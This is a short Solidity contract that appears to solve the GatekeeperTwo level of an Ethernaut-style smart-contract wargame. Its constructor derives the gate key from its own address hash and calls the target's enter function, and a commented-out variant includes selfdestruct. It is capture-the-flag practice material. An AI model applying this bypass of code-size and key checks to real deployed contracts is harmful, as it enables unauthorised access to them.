// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAtt {
    constructor(address target) public {
        uint64 key = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        ) ^ (uint64(0) - 1);
        GatekeeperTwo(target).enter(bytes8(key));
    }
    // function attack(address target) public {
    //     selfdestruct(tx.origin);
    //     uint64 key = uint64(
    //         bytes8(keccak256(abi.encodePacked(address(this))))
    //     ) ^ (uint64(0) - 1);
    //     GatekeeperTwo(target).enter(bytes8(key));
    // }
}
